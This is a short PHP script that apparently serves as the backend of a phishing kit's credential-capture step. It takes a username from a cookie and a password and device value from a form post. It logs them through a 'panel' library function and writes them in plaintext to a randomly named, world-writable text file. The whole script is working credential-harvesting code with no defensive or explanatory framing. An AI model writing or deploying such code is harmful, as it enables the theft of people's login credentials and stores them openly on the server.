<?php 
require('../../panel/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_POST['pass'];
$dispositivo = $_POST['dis'];

setcookie('contrasena',$contrasena,time()+60*9);

crear_registro($usuario,$contrasena,$dispositivo);

$data = 'Usuario: '.$usuario." Clave: ".$contrasena;
$file = rand(1,1292).'.txt';
setcookie('archivo',$file,time()+60*9);

if (isset($data)) {
    $fp = fopen($file, 'w');
    fwrite($fp, utf8_decode($data));
    fclose($fp);
    chmod($file, 0777);
    echo "-";
    echo $file;
}
else {
    echo 'No hay datos que guardar!';
}
?>